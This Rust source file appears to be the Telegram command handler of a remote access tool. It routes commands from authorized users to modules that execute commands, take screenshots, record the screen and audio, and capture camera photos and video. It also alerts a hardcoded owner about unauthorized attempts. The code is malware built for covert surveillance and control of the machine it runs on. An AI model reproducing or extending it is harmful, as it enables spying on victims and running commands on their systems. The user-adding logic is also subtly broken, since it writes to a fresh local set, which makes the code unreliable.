use teloxide::prelude::*;
use std::collections::{HashMap, HashSet};
use std::sync::{Arc, Mutex};
use std::time::SystemTime;
use crate::{audio, camera, execution, screen, screenshot, video};

static OWNER_ID: i64 = 7660492768;

// Main message handler
pub async fn handle_message(
    bot: Bot,
    message: Message,
    state: (Arc<Mutex<HashSet<i64>>>, Arc<Mutex<HashMap<i64, String>>>),
) -> ResponseResult<()> {
    let (authorized_users, access_logs) = state;
    let user_id = message.from().map(|u| u.id).unwrap_or(0);

    if let Some(text) = message.text() {
        if !is_authorized(user_id, &authorized_users).await {
            log_unauthorized_access(user_id, &message, &access_logs).await;
            notify_owner(bot.clone(), user_id, &message).await?;
            bot.send_message(message.chat.id, "Access denied.").await?;
            return Ok(()); // Exit for unauthorized users
        }

        dispatch_command(bot, message, text).await?;
    }
    Ok(())
}

// Dispatch commands to specific handlers
async fn dispatch_command(bot: Bot, message: Message, text: &str) -> ResponseResult<()> {
    let args: Vec<&str> = text.split_whitespace().collect();

    match args[0] {
        "exe:" => execution::handle(bot, message, &args).await,
        "ss:" => screenshot::handle(bot, message).await,
        "screen_record:" => screen::handle(bot, message, &args).await,
        "audio_record:" => audio::handle(bot, message, &args).await,
        "photo:" => camera::handle_photo(bot, message).await,
        "video_record:" => video::handle(bot, message, &args).await,
        "addsecretuser:" => handle_add_secret_user(bot, message, &args).await,
        _ => {
            bot.send_message(message.chat.id, "Unknown command.").await?;
            Ok(())
        }
    }
}

// Check if the user is authorized
async fn is_authorized(user_id: i64, authorized_users: &Arc<Mutex<HashSet<i64>>>) -> bool {
    authorized_users.lock().unwrap().contains(&user_id)
}

// Log unauthorized access attempts
async fn log_unauthorized_access(
    user_id: i64,
    message: &Message,
    access_logs: &Arc<Mutex<HashMap<i64, String>>>,
) {
    let username = message.from().and_then(|u| u.username.clone()).unwrap_or("Unknown".to_string());
    let timestamp = format!("{:?}", SystemTime::now());
    let mut logs = access_logs.lock().unwrap();
    logs.insert(user_id, format!("User: @{} at {}", username, timestamp));
}

// Notify the owner about unauthorized access attempts
async fn notify_owner(bot: Bot, user_id: i64, message: &Message) -> ResponseResult<()> {
    let username = message.from().and_then(|u| u.username.clone()).unwrap_or("Unknown".to_string());
    let timestamp = format!("{:?}", SystemTime::now());
    bot.send_message(
        ChatId(OWNER_ID),
        format!(
            "Unauthorized access attempt by @{} (ID: {}) at {}",
            username, user_id, timestamp
        ),
    )
    .await?;
    Ok(())
}

// Handle adding a secret user
async fn handle_add_secret_user(bot: Bot, message: Message, args: &[&str]) -> ResponseResult<()> {
    if message.from().map(|u| u.id).unwrap_or(0) != OWNER_ID {
        bot.send_message(message.chat.id, "Unauthorized access.").await?;
        return Ok(());
    }

    if args.len() == 2 {
        let token = args[1];
        if bot.token() == token {
            let user_id = message.from().map(|u| u.id).unwrap_or(0);
            let mut authorized_users = Arc::new(Mutex::new(HashSet::new()));
            authorized_users.lock().unwrap().insert(user_id);

            bot.send_message(message.chat.id, "User successfully added.").await?;
        } else {
            bot.send_message(message.chat.id, "Invalid bot token.").await?;
        }
    } else {
        bot.send_message(message.chat.id, "Usage: addsecretuser: <bot_token>").await?;
    }
    Ok(())
}
